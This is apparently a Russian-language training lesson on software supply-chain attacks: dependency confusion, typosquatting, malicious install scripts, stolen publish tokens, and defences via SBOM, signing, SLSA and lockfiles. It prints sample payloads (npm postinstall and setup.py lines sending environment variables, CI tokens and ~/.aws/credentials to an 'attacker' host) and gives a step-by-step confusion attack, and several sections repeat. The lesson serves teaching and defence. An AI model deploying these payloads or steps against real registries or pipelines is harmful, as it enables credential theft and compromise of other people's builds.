---
id: cloud-supply-chain
title: "Supply chain: dependency confusion, компрометация сборки и подпись артефактов"
category: cloud
parent: cloud-cicd-secrets
difficulty: hard
order: 1
tags: [cloud, supply-chain, dependencies, npm, pypi, sbom, signing]
prerequisites: [cloud-cicd-secrets]
useful_for:
  - "Атаки на цепочку поставки ПО в облачных организациях"
  - "Понимание dependency confusion и typosquatting"
  - "Защита сборки: SBOM, подписи, SLSA"
estimated_minutes: 45
summary: "Цепочка поставки — это доверие к чужому коду и артефактам. Разбираем dependency confusion, typosquatting, компрометацию инструментов сборки, злоупотребление publish-токенами, а также защиту через SBOM и подписи."
---

Облачные организации собирают софт из сотен сторонних пакетов и инструментов. Цепочка поставки — это всё доверие между вашим кодом и чужим. Скомпрометировав один пакет или один пайплайн, атакующий получает код внутри периметра жертвы. Урок — про атаки и защиту.

## Модель угроз supply chain

Классические векторы:

- **Dependency confusion** — внутренний пакет с тем же именем публикуется в публичном реестре.
- **Typosquatting** — имя похоже на популярное (`reqeusts` вместо `requests`).
- **Компрометация maintainer** — захват аккаунта автора пакета (как event-stream/`flatmap-stream`).
- **Вредоносные install-скрипты** — `postinstall` в npm, `setup.py` в PyPI, `build.rs` в Cargo.
- **Компрометация CI** — подмена сборки, кэша, артефактов.
- **Злоупотребление publish-токенами** — утёкший `NPM_TOKEN`/`PYPI_TOKEN`.

| Вектор | Где проявляется | Что даёт атакующему |
|--------|-----------------|---------------------|
| Dependency confusion | `npm install <internal-name>` | Код на CI/разработчике |
| Typosquatting | `npm install`, `pip install` | То же, но пассивно |
| postinstall | npm-пакет | RCE при установке |
| Compromised maintainer | любой реестр | RCE в тысячах проектов |
| CI cache poisoning | пайплайн | Подмена артефакта деплоя |

## Dependency confusion: как это работает

Сценарий: компания использует внутренний реестр (Artifactory/Nexus/Private PyPI) и **не закрепляет** внутренние пакеты за приватным scope. Инструмент сборки сначала спросит приватный реестр, а если пакета нет — публичный.

```bash
# Разведка: имена внутренних пакетов утекают из кода, SBOM, CI-логов
grep -rE '"(dependencies|devDependencies)"' package.json
grep -rn 'index-url\|extra-index-url' pip.conf setup.cfg
# Утечки имён: SBOM, package-lock.json, .npmrc, комментарии
```

Атакующий публикует в публичном реестре пакет с **более высокой версией**, чем внутренний:

```bash
# Публикуем в npm пакет с тем же именем и version 9999.0.0
npm publish --access public
# Теперь `npm install internal-lib` на CI подтянет ПУБЛИЧНЫЙ пакет
```

Проверка уязвимости (защита):

```bash
# Явно задать scope и registry для приватных пакетов в .npmrc
# @company:registry=https://nexus.company.local/repository/npm/
# Проверить, что internal-пакеты не резолвятся из public
npm view <internal-name> --registry=https://registry.npmjs.org
```

## Вредоносные install-скрипты

Даже без confusion пакет может выполнить код при установке.

```json
// package.json вредоносного пакета
{
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://attacker/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  }
}
```

```python
# setup.py вредоносного PyPI-пакета
from setuptools import setup
import os, urllib.request
urllib.request.urlopen("https://attacker/?env=" + os.environ.get("CI_JOB_TOKEN",""))
setup(name="typo-name", version="0.0.1")
```

Защита: `npm install --ignore-scripts`, `pip install --no-build-isolation` не поможет — используйте allowlist, `npm audit signatures`, lock-файлы.

## Компрометация CI и злоупотребление publish-токенами

Publish-токены часто лежат в CI-секретах. Утёкший токен = публикация от имени организации.

```bash
# Проверка npm-токена
curl -H "Authorization: Bearer $NPM_TOKEN" https://registry.npmjs.org/-/whoami
# PyPI: загрузка через twine
TWINE_USERNAME=__token__ TWINE_PASSWORD=$PYPI_TOKEN twine upload dist/*
```

Типичные утечки: `.npmrc` с `_authToken` в репозитории, токен в логах CI, токен в Docker-образе. Ищите:

```bash
grep -rE '_authToken|NPM_TOKEN|PYPI_TOKEN|CARGO_REGISTRY' . --hidden
docker history <image> | grep -i token
```

## Разобранный пример: от утёкшего имени пакета до RCE на CI

**Дано:** публичный репозиторий, в `package-lock.json` виден приватный пакет `acme-auth-utils`.

1. Проверяем, зарегистрирован ли он публично: `npm view acme-auth-utils` → 404.
2. Публикуем `acme-auth-utils@99.0.0` с `postinstall`, который шлёт `CI_JOB_TOKEN` и переменные окружения на наш сервер.
3. Ждём следующий `npm ci` на CI (lock-файл обновят при добавлении зависимости) → получаем токены пайплайна.
4. Из токена CI — переход к облаку (см. `cloud-cicd-secrets`).

Ключевой момент: **lock-файл может защитить**, если в нём зафиксирован `resolved` URL приватного реестра и integrity-хэш. Если нет — confusion срабатывает.

## Защита: SBOM, подписи, SLSA, pinned versions

- **SBOM** (CycloneDX/SPDX) — инвентарь зависимостей; нужен, чтобы знать, что у вас внутри.
- **Подпись артефактов** — Sigstore/cosign, GPG, in-toto.
- **SLSA** — уровни гарантий сборки (1–4), защита от подмены пайплайна.
- **Pinned versions + integrity** — `package-lock.json`, `poetry.lock`, хэши.
- **Allowlist реестров** — запрет публичного резолва внутренних имён.

```bash
# Генерация SBOM
syft packages dir:. -o cyclonedx-json > sbom.json
# Проверка подписи образа
cosign verify --key cosign.pub <registry>/<image>:<tag>
# Скан на уязвимые зависимости
grype sbom:sbom.json
```

## Частые ошибки

- **Доверять lock-файлу, не проверяя `resolved`.** Lock можно отравить, если URL указывает на публичный реестр.
- **Забыть про dev-зависимости.** Они исполняются на CI, но не попадают в прод-артефакт.
- **Игнорировать install-скрипты.** `postinstall`/`preinstall` — прямой RCE-канал.
- **Хранить publish-токены в репозитории.** `.npmrc` с `_authToken` — частая утечка.
- **Не проверять подписи.** Без verify любой образ можно подменить.
- **Считать, что «мы не используем публичный npm».** Транзитивные зависимости всё равно оттуда.

## Что дальше / решение

- Нашли внутреннее имя пакета без публичной регистрации → проверяйте confusion.
- Нашли publish-токен → проверяйте права на публикацию.
- Нашли CI с install-скриптами → смотрите, какие env-переменные доступны скриптам.
- Смежные уроки: `cloud-cicd-secrets`, `cloud-terraform`, `cloud-cloudformation`, `cloud-artifact-registry`.

## Модель угроз supply chain

Атакуется путь «исходники → сборка → артефакт → деплой». Точки: зависимости (npm/pypi), CI/CD, registry, подпись. Цель — выполнить код на этапе сборки (доступ к секретам) или внедрить backdoor в артефакт.

## Dependency confusion

Если внутренний пакет (`@company/utils`) отсутствует в публичном registry, а resolver не приоритизирует приватный — атакующий публикует пакет с тем же именем и версией выше. Установщик тянет публичный пакет. Проверка: посмотреть `.npmrc`/`pip.conf` и порядок registry.

```bash
npm view @company/utils versions   # публичный пакет существует?
pip index versions company-utils
```

## Вредоносные install-скрипты

`postinstall` (npm), `setup.py` (pip) выполняются при установке. Вредоносный пакет крадёт env, `~/.aws`, токены CI.

```json
{"scripts":{"postinstall":"curl -d @/root/.aws/credentials http://attacker/"}}
```

## Разобранный пример: от утёкшего имени пакета до RCE на CI

1. В логах CI видим имя внутреннего пакета.
2. Он отсутствует в публичном registry.
3. Публикуем пакет с тем же именем и `postinstall`.
4. Следующая сборка тянет его → выполняется код → креды CI уходят наружу.
5. Через креды CI — облачный доступ.

## Защита

SBOM, подписи (sigstore), SLSA-уровни, pinned versions и хэши (lockfiles), приоритет приватных registry, изоляция сборки, сканирование зависимостей (trivy, grype, socket.dev).

## Частые ошибки

- Lockfile без integrity-хэшей.
- Отсутствие приоритета приватного registry.
- Доверие к `latest`.
- Нет мониторинга новых публикаций внутренних имён.

## Прокси для перехвата сборки

Если сборка идёт через внутренний прокси-registry, атакующий, контролирующий прокси, может подменять пакеты на лету (MITM). Это сложнее, чем dependency confusion, но и незаметнее. Защита — TLS с пиннингом, подписанные пакеты и проверка целостности (lockfile с хэшами). Проверьте, ходят ли сборки в публичный registry напрямую или через прокси.

## Быстрая проверка

```bash
npm view @company/utils versions
pip index versions company-utils
grep -r postinstall package.json
gitleaks detect --source .
```

Проверьте, публикуется ли внутреннее имя пакета, есть ли install-скрипты и не утекли ли токены публикации. Dependency confusion начинается с этих трёх проверок.

## Квиз

```quiz
- question: "В чём суть dependency confusion?"
  options:
    - "Публикуется публичный пакет с именем внутреннего, и сборка подтягивает его вместо приватного"
    - "Удаляется lock-файл"
    - "Меняется версия Node.js"
    - "Отключается TLS"
  answer: 0
  explanation: "Приоритет публичного реестра над приватным и есть confusion."
- question: "Какой механизм npm выполняет код сразу при установке?"
  options:
    - "postinstall-скрипт"
    - "lock-файл"
    - "engines"
    - "peerDependencies"
  answer: 0
  explanation: "postinstall/preinstall выполняются при install."
- question: "Что такое SBOM?"
  options:
    - "Инвентарь компонентов ПО и их зависимостей"
    - "Тип CI-раннера"
    - "Формат образа контейнера"
    - "Протокол шифрования"
  answer: 0
  explanation: "Software Bill of Materials перечисляет всё, что внутри."
- question: "Чем SLSA помогает цепочке поставки?"
  options:
    - "Задаёт уровни гарантий защищённости сборки"
    - "Ускоряет сборку"
    - "Шифрует исходники"
    - "Заменяет CI"
  answer: 0
  explanation: "SLSA — уровни гарантий сборки от подмены."
- question: "Почему dev-зависимости опасны для supply chain?"
  options:
    - "Они исполняются на CI, хотя не попадают в прод-артефакт"
    - "Они всегда вредоносны"
    - "Они не устанавливаются"
    - "Они зашифрованы"
  answer: 0
  explanation: "CI исполняет их в доверенном контексте с секретами."
```

## Где пригодится

- **Bug bounty:** уязвимости в пайплайнах и реестрах публичных организаций.
- **Red team:** компрометация сборки как путь в периметр.
- **Пентест:** аудит CI/CD и зависимостей.
- **Работа/DevSecOps:** внедрение SBOM, подписей, SLSA, allowlist реестров.
- **Дальше по дереву:** `cloud-cicd-secrets`, `cloud-artifact-registry`.
